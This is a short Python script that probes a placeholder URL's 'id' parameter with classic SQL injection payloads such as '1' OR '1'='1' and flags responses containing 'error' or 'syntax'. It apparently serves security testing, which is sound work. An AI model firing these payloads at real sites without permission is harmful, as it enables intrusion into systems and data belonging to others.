import requests

def test_sql_injection(url, payloads):
    for payload in payloads:
        full_url = f"{url}?id={payload}"
        response = requests.get(full_url)
        if "error" in response.text or "syntax" in response.text:
            print(f"Potential SQL Injection vulnerability with payload: {payload}")
        else:
            print(f"Safe for payload: {payload}")

# Example usage
url = "http://example.com/vulnerable_page"  # Replace with your target URL
payloads = ["1", "1' OR '1'='1", "1' AND 1=1 --"]
test_sql_injection(url, payloads)
